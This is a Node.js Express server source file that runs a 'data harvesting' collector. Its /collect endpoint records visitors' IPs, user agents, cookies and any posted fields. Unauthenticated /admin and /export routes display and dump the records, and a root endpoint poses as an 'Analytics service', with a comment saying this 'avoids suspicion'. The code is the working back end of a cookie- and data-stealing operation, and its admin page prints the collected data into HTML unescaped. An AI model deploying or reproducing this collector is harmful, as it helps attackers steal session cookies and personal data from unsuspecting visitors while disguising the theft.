const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse all incoming data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Data storage (upgrade to database later)
let harvestedData = [];
let visitorCount = 0;

// Main harvesting endpoint
app.post('/collect', (req, res) => {
    const clientInfo = {
        id: ++visitorCount,
        ip: req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress,
        userAgent: req.get('User-Agent'),
        timestamp: new Date().toISOString(),
        referrer: req.get('Referer'),
        language: req.get('Accept-Language'),
        cookies: req.headers.cookie,
        // Additional harvested data from request body
        ...req.body
    };
    
    harvestedData.push(clientInfo);
    console.log('🪣 Harvested data:', clientInfo);
    
    // Send success response
    res.json({ 
        status: 'success', 
        message: 'Data collected successfully',
        dataId: clientInfo.id
    });
});

// Admin dashboard to view harvested data
app.get('/admin', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Data Analytics Dashboard</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .data-entry { border: 1px solid #ccc; padding: 10px; margin: 10px 0; }
                .count { color: green; font-weight: bold; }
            </style>
        </head>
        <body>
            <h1>📊 Data Harvesting Dashboard</h1>
            <p>Total entries: <span class="count">${harvestedData.length}</span></p>
            <div id="dataContainer">
                ${harvestedData.slice(-20).reverse().map(data => `
                    <div class="data-entry">
                        <strong>ID:</strong> ${data.id} | 
                        <strong>IP:</strong> ${data.ip} | 
                        <strong>Time:</strong> ${data.timestamp}
                        <pre>${JSON.stringify(data, null, 2)}</pre>
                    </div>
                `).join('')}
            </div>
        </body>
        </html>
    `);
});

// Health check endpoint (avoids suspicion)
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'Analytics service running',
        version: '1.0.0',
        timestamp: new Date().toISOString()
    });
});

// Export data endpoint
app.get('/export', (req, res) => {
    res.json({
        total: harvestedData.length,
        data: harvestedData
    });
});

// Clear data endpoint
app.delete('/clear', (req, res) => {
    harvestedData = [];
    visitorCount = 0;
    res.json({ status: 'success', message: 'Data cleared' });
});

app.listen(PORT, () => {
    console.log(`🚀 Data harvesting server running on port ${PORT}`);
    console.log(`📡 Collection endpoint: http://localhost:${PORT}/collect`);
    console.log(`👨‍💼 Admin panel: http://localhost:${PORT}/admin`);
});
